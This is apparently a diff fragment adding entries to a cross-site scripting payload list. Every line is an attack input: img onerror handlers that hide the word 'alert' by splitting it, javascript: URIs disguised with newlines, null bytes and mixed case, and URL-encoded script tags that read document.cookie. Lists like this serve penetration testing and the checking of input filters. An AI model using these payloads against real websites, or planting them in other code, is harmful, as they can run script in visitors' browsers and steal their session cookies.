@@ -1,3 +1,10 @@
+<samp><script><section><img onerror="alert()" src />
+<samp><script><section><img onerror="self['ale'+'rt']()" src />
+<section><img onerror="self['ale'+'rt']()" src />
+java\nscript:alert(1)
+\0x1javascript:alert(1)
+jaVAscrIpt:alert(1)
+onerror="self['ale'+'rt']()"
 %u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ealert(document%20.%20cookie)%u003c%u002fScRiPt%u003e
 document%20.%20cookie
 %u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ewindow["document"]["cookie"])%u003c%u002fScRiPt%u003e
